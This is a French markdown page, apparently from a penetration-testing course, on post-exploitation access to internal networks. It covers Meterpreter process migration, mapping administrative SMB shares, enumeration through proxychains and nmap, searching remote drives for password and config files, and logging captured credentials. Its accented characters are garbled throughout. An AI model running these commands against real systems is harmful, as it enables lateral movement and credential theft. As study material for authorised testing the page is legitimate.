# üåê Acc√®s aux R√©seaux Internes

[‚Üê Retour au pivoting](README.md) | [‚Üê Table des mati√®res](../README.md)

## üìã Table des Mati√®res
- [Migration de Processus](#migration-de-processus)
- [Mappage de Lecteurs R√©seau](#mappage-de-lecteurs-r√©seau)
- [D√©couverte de Ressources](#d√©couverte-de-ressources)
- [Acc√®s aux Shares SMB](#acc√®s-aux-shares-smb)
- [Troubleshooting](#troubleshooting)

## Migration de Processus

### Pourquoi migrer ?
Certains acc√®s r√©seau n√©cessitent un contexte utilisateur plut√¥t que SYSTEM.

### Processus recommand√©s
```bash
# Lister les processus disponibles
ps

# Migration vers processus utilisateur (recommand√©)
migrate -N explorer.exe

# Alternatives stables
migrate -N winlogon.exe
migrate -N svchost.exe
```

**Concept :** `explorer.exe` s'ex√©cute dans le contexte de l'utilisateur connect√©, permettant l'acc√®s aux ressources r√©seau avec les permissions utilisateur.

## Mappage de Lecteurs R√©seau

### Commandes de base
```bash
# Depuis une session shell sur la machine compromise
shell

# Mappage avec credentials par d√©faut
net use Z: \\target_interne\C$
net use Y: \\target_interne\Documents

# Mappage avec credentials sp√©cifiques
net use Z: \\target_interne\C$ /user:domain\username password
```

### Gestion des mappages
```bash
# Lister les mappages actifs
net use

# Exploration des donn√©es
dir Z:
dir Y:

# Suppression de mappages
net use Z: /delete
net use * /delete  # Supprimer tous les mappages
```

## D√©couverte de Ressources

### √ânum√©ration des machines
```bash
# D√©couverte des machines du r√©seau
net view

# Ressources partag√©es d'une machine sp√©cifique
net view \\target_interne

# Informations sur le domaine
net view /domain
```

### Scan via pivot (avec proxychains)
```bash
# Scan de d√©couverte r√©seau
proxychains nmap 192.168.1.0/24 -sn

# Scan des services SMB
proxychains nmap 192.168.1.0/24 -p 445 -sT --open
```

## Acc√®s aux Shares SMB

### Workflow complet
```bash
# 1. Migration si n√©cessaire
migrate -N explorer.exe

# 2. D√©couverte des ressources
shell
net view target_interne

# 3. Test d'acc√®s aux shares administratifs
net use \\target_interne\C$ 
net use \\target_interne\ADMIN$

# 4. Acc√®s aux shares utilisateur
net use \\target_interne\Users
net use \\target_interne\shared
```

### Exploration des donn√©es
```bash
# Navigation dans les shares
dir \\target_interne\C$\Users
dir \\target_interne\C$\Windows\System32

# Recherche de fichiers sensibles
dir \\target_interne\C$\*.txt /s
dir \\target_interne\C$\*password* /s
dir \\target_interne\C$\*config* /s
```

## Troubleshooting

### Erreurs courantes

#### "Access Denied"
```bash
# V√©rifier le contexte utilisateur
whoami

# Essayer la migration
migrate -N explorer.exe

# Tester avec credentials explicites
net use \\target\share /user:domain\user password
```

#### "Network path not found"
```bash
# V√©rifier la connectivit√© r√©seau
ping target_interne

# V√©rifier les routes de pivoting
run autoroute -p

# Tester via proxychains
proxychains telnet target_interne 445
```

#### "The specified network name is no longer available"
```bash
# Session r√©seau expir√©e, reconnecter
net use \\target_interne\IPC$ /delete
net use \\target_interne\IPC$
```

### Optimisations

#### R√©duction des timeouts
```bash
# Configurer des timeouts plus courts
net config server /autodisconnect:5

# Utiliser des commandes avec timeout
timeout 30 net view target_interne
```

#### Gestion des credentials
```bash
# Sauvegarder les credentials d√©couverts
echo "target_interne\administrator:password123" >> creds.txt

# Utiliser runas pour changer de contexte
runas /user:domain\administrator cmd
```

## R√©f√©rences

- [Pivoting avec Metasploit](../05-post-exploitation/pivoting-metasploit.md)
- [√ânum√©ration SMB](../03-enumeration/smb-samba.md)
- [CrackMapExec](../06-tools/crackmapexec.md)